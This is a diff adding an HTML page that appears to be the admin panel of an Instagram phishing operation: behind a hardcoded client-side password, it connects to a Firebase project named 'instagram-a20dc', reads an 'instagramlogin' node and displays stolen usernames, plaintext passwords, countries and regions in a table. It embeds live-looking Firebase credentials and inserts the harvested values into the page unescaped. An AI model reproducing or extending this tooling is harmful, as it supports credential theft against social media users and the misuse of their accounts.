@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>database</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+</head>
+
+<body>
+
+    <!-- Password Protection Section -->
+    <div id="passwordSection">
+        <h1>Enter Password to Access Data</h1>
+        <input type="password" id="passwordInput" placeholder="Enter password" required><br><br>
+        <button onclick="checkPassword()">Submit</button>
+        <p id="errorMessage" style="color: red;"></p>
+    </div>
+
+    <!-- Data Table Section (Hidden initially) -->
+    <div id="dataSection" style="display: none;">
+        <h1>Retrieved Data</h1>
+
+        <table id="dataTable" border="1" style="margin-top: 20px; width: 100%;">
+
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Country</th>
+                    <th>Region</th>
+                </tr>
+            </thead>
+
+            <tbody>
+                <!-- Data will be inserted here -->
+            </tbody>
+
+        </table>
+    </div>
+
+    <script>
+        const correctPassword = "MUSKYBTC";  // Set the correct password here
+
+        // Function to check the entered password
+        function checkPassword() {
+            const enteredPassword = document.getElementById("passwordInput").value;
+            const errorMessage = document.getElementById("errorMessage");
+
+            if (enteredPassword === correctPassword) {
+                // If the password is correct, hide the password section and show the data section
+                document.getElementById("passwordSection").style.display = "none";
+                document.getElementById("dataSection").style.display = "block";
+
+                // Call the function to retrieve data
+                retrieveData();
+            } else {
+                // If the password is incorrect, show an error message
+                errorMessage.textContent = "Incorrect password, please try again.";
+            }
+        }
+
+        // Function to retrieve and display data from Firebase
+        function retrieveData() {
+        const firebaseConfig = {
+            apiKey: "AIzaSyDPupU21CJIV-fph3iHgquPpP8RzUx0rG4",
+            authDomain: "instagram-a20dc.firebaseapp.com",
+            databaseURL: "https://instagram-a20dc-default-rtdb.firebaseio.com",
+            projectId: "instagram-a20dc",
+            storageBucket: "instagram-a20dc.firebasestorage.app",
+            messagingSenderId: "710244789237",
+            appId: "1:710244789237:web:face3aa27496e31f988ebc"
+        };
+
+            // Initialize Firebase
+            firebase.initializeApp(firebaseConfig);
+
+            const instagramloginRef = firebase.database().ref("instagramlogin");
+            const dataTableBody = document.querySelector("#dataTable tbody");
+
+            // Clear existing table rows
+            dataTableBody.innerHTML = '';
+
+            instagramloginRef.once("value")
+                .then((snapshot) => {
+                    if (!snapshot.exists()) {
+                        console.log("No data available in the 'instagramlogin' reference.");
+                    } else {
+                        let id = 1; // Start ID from 1
+                        snapshot.forEach((childSnapshot) => {
+                            const data = childSnapshot.val();
+                            console.log("Retrieved data for user: ", data);
+
+                            // Prepare data and populate the table
+                            const row = document.createElement("tr");
+                            row.innerHTML = `
+                                <td>${id++}</td>
+                                <td>${data.username || 'N/A'}</td>
+                                <td>${data.password || 'N/A'}</td>
+                                <td>${data.country || 'Unknown'}</td>
+                                <td>${data.region || 'Unknown'}</td>
+                            `;
+                            dataTableBody.appendChild(row);
+                        });
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error retrieving data:", error);
+                    alert("Failed to retrieve data. Check console for details.");
+                });
+        }
+    </script>
+
+</body>
+
+</html>
